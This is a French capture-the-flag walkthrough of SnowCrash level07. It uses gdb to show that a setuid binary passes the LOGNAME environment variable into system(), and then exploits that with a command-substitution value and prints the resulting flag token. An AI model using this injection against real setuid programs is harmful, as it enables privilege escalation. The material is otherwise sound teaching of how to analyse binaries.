```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
Un seul fichier cette fois ci, executé avec les droits de flag07, on commence à avoir l'habitude.
```
level07@SnowCrash:~$ ./level07 testarg  
level07
```
Pas de sources pour l'accompagner, on va devoir utiliser `gdb` pour comprendre son fonctionnement.  
`level07@SnowCrash:~$ gdb level07`:
```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x08048514 <+0>:	push   ebp
   0x08048515 <+1>:	mov    ebp,esp
   0x08048517 <+3>:	and    esp,0xfffffff0
   0x0804851a <+6>:	sub    esp,0x20
   0x0804851d <+9>:	call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:	mov    DWORD PTR [esp+0x18],eax
   0x08048526 <+18>:	call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804852f <+27>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048533 <+31>:	mov    DWORD PTR [esp+0x8],eax
   0x08048537 <+35>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804853b <+39>:	mov    DWORD PTR [esp+0x4],eax
   0x0804853f <+43>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048543 <+47>:	mov    DWORD PTR [esp],eax
   0x08048546 <+50>:	call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804854f <+59>:	mov    DWORD PTR [esp+0x8],eax
   0x08048553 <+63>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048557 <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x0804855b <+71>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804855f <+75>:	mov    DWORD PTR [esp],eax
   0x08048562 <+78>:	call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:	mov    DWORD PTR [esp+0x14],0x0
   0x0804856f <+91>:	mov    DWORD PTR [esp],0x8048680
   0x08048576 <+98>:	call   0x8048400 <getenv@plt> ; 1
   0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
   0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
   0x08048587 <+115>:	lea    eax,[esp+0x14]
   0x0804858b <+119>:	mov    DWORD PTR [esp],eax
   0x0804858e <+122>:	call   0x8048440 <asprintf@plt> ; 2
   0x08048593 <+127>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048597 <+131>:	mov    DWORD PTR [esp],eax
   0x0804859a <+134>:	call   0x8048410 <system@plt> ; 3
   0x0804859f <+139>:	leave  
   0x080485a0 <+140>:	ret    
End of assembler dump.
```
Les parties qui nous interessent sont les suivantes (j'ai indiqué dans le dump les emplacements correspondants avec les commentaires`;`:  
1. Recuperation d'une variable environnement avec `getenv`
2. Creation d'une string avec `asprintf`
3. Execution d'une commande avec `system`

Dans le détail:
```gdb
(gdb) b *0x08048576
Breakpoint 1 at 0x8048576: file /home/user/level07/level07.c, line 21.
...
   0x0804856f <+91>:	movl   $0x8048680,(%esp)
=> 0x08048576 <+98>:	call   0x8048400 <getenv@plt>
...
(gdb) x/s 0x8048680
0x8048680:	"LOGNAME"
```
On recupere donc la valeur de la variable d'environnement LOGNAME... mais que fait-on avec ?
```
level07@SnowCrash:~$ LOGNAME=test ./level07 
test
```
Allons voir dans `asprintf`:
```gdb
(gdb) b *0x0804858e
Breakpoint 1 at 0x804858e: file /home/user/level07/level07.c, line 21.
...
   0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
   0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
   0x08048587 <+115>:	lea    eax,[esp+0x14]
   0x0804858b <+119>:	mov    DWORD PTR [esp],eax
=> 0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
...
(gdb) x/s 0x8048688
0x8048688:	"/bin/echo %s "
```
On va donc creer une string avec `printf("/bin/echo %s ", LOGNAME)` et en avançant un peu on voit...
```gdb
...
   0x08048597 <+131>:	mov    DWORD PTR [esp],eax
=> 0x0804859a <+134>:	call   0x8048410 <system@plt>
...
(gdb) x/s $eax
0x804b070:	"/bin/echo level07 "
```
...qu'elle est appelée avec `system` !  
L'exploit devient évident:
```
level07@SnowCrash:~$ LOGNAME=\`getflag\` ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
Le flag est donc `fiumuikeil55xe9cu4dood66h` ! :tada:
